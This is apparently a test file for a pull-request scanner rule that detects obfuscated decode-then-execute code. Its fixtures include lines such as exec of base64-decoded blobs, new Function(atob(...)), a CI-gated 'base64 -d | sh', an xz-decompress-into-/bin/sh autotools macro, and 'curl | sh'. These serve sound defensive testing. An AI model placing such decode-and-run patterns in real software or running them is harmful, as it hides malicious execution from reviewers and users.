"""EXEC-OBFUSCATED: decode-then-run and decoded-stream-into-shell (gap 1 of docs/recall-real-attacks.md)."""

from pr_scanner.models import ChangedFile, Diff, Severity
from pr_scanner.rules import default_registry
from pr_scanner.rules.obfuscated import ObfuscatedExec


def file(path, *lines, status="added", binary=False):
    return ChangedFile(path=path, status=status, is_binary=binary, added_lines=tuple(enumerate(lines, 1)))


def run(*files):
    return list(ObfuscatedExec().evaluate(Diff("a" * 40, "b" * 40, tuple(files))))


def test_registered_by_default():
    assert "EXEC-OBFUSCATED" in {r.id for r in default_registry().rules()}


# ---- positives ---------------------------------------------------------------------------

def test_python_exec_of_decoded_blob_same_line_is_high():
    (f,) = run(file("src/a/util.py", "import base64", "exec(base64.b64decode(BLOB))"))
    assert f.rule_id == "EXEC-OBFUSCATED" and f.severity == Severity.HIGH
    assert f.line == 2 and f.file == "src/a/util.py"
    assert f.rationale and f.remediation


def test_js_decipher_then_compile_few_lines_apart_is_high():
    (f,) = run(file("lib/x.js",
        "var d = crypto.createDecipher('aes256', key);",
        "var p = d.update(blob, 'hex', 'utf8') + d.final('utf8');",
        "var m = new Module();",
        "m._compile(p, 'x');"))
    assert f.severity == Severity.HIGH and f.line == 4


def test_js_new_function_on_atob_is_high():
    (f,) = run(file("app/a.js", "new Function(atob(s))()"))
    assert f.severity == Severity.HIGH


def test_decoded_stream_piped_into_shell_in_autotools_macro_is_high():
    (f,) = run(file("m4/build-to-host.m4", "  tr '\\t \\-_' ' \\t_\\-' < \"$f\" | xz -d | /bin/sh"))
    assert f.severity == Severity.HIGH


def test_ci_gated_decode_and_run_is_critical():
    (f,) = run(file("build-aux/x.sh",
        'if test "x$CI" = x; then',
        "  base64 -d < payload.txt | sh",
        "fi"))
    assert f.severity == Severity.CRITICAL
    assert "CI" in f.rationale


def test_shell_eval_of_decoded_output_is_high():
    (f,) = run(file("scripts/a.sh", 'eval "$(echo "$X" | base64 -d)"'))
    assert f.severity == Severity.HIGH


def test_signals_between_6_and_12_lines_apart_are_medium():
    lines = ["data = base64.b64decode(B)"] + ["x = 1"] * 8 + ["exec(data)"]
    (f,) = run(file("a.py", *lines))
    assert f.severity == Severity.MEDIUM


# ---- negatives ---------------------------------------------------------------------------

def test_decode_alone_and_exec_alone_do_not_fire():
    assert run(file("a.py", "x = base64.b64decode(s)")) == []
    assert run(file("a.py", "exec(code)")) == []
    assert run(file("a.sh", "eval \"$(ssh-agent -s)\"")) == []


def test_exec_of_a_file_in_the_repo_is_not_a_hidden_payload():
    assert run(file("setup.py", "import base64", 'exec(open("_version.py").read())')) == []
    assert run(file("setup.py", "import base64", 'exec(compile(open("v.py").read(), "v", "exec"))')) == []


def test_exec_of_decoded_file_content_still_fires():
    (f,) = run(file("setup.py", 'exec(base64.b64decode(open("blob.txt").read()))'))
    assert f.severity == Severity.HIGH


def test_pipe_to_shell_without_decode_is_not_this_rule():
    assert run(file("a.sh", "curl -s https://example.invalid/x | sh")) == []


def test_regex_exec_on_decoded_text_does_not_fire():
    assert run(file("a.js", "const m = /a(b)/.exec(atob(s));")) == []


def test_far_apart_signals_do_not_fire():
    lines = ["data = base64.b64decode(B)"] + ["x = 1"] * 30 + ["exec(other)"]
    assert run(file("a.py", *lines)) == []


def test_comments_are_ignored():
    assert run(file("a.py", "# exec(base64.b64decode(BLOB))")) == []
    assert run(file("a.js", "// new Function(atob(s))()")) == []


def test_docs_removed_and_binary_files_are_not_candidates():
    assert run(file("README.md", "exec(base64.b64decode(BLOB))")) == []
    assert run(file("a.py", "exec(base64.b64decode(BLOB))", status="removed")) == []
    assert run(file("a.py", "exec(base64.b64decode(BLOB))", binary=True)) == []


# ---- large generated files and padding ---------------------------------------------------

def test_large_file_is_only_low():
    filler = ["var a_%d = %d;" % (i, i) for i in range(12000)]  # > 100k code chars
    (f,) = run(file("dist/bundle.js", *filler, "new Function(atob(s))()"))
    assert f.severity == Severity.LOW


def test_whitespace_padding_does_not_make_a_small_file_large():
    (f,) = run(file("a.js", " " * 300_000 + "new Function(atob(s))()"))
    assert f.severity == Severity.HIGH


def test_padding_with_comment_lines_does_not_hide_signals():
    lines = ["data = base64.b64decode(B)"] + ["# pad"] * 50 + ["exec(data)"]
    # comment lines are skipped entirely, so distance counts code lines only
    (f,) = run(file("a.py", *lines))
    assert f.severity == Severity.HIGH
